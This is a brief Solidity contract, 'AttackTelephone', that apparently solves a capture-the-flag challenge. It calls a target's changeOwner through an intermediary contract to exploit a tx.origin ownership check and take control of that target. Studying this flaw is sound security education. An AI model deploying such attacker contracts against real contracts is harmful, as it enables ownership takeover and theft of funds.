// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {

  ITelephone public telephone;

  constructor(ITelephone _telephone) {
    telephone = _telephone;
  }

  function changeOwner() public {
    telephone.changeOwner(msg.sender);
  }
}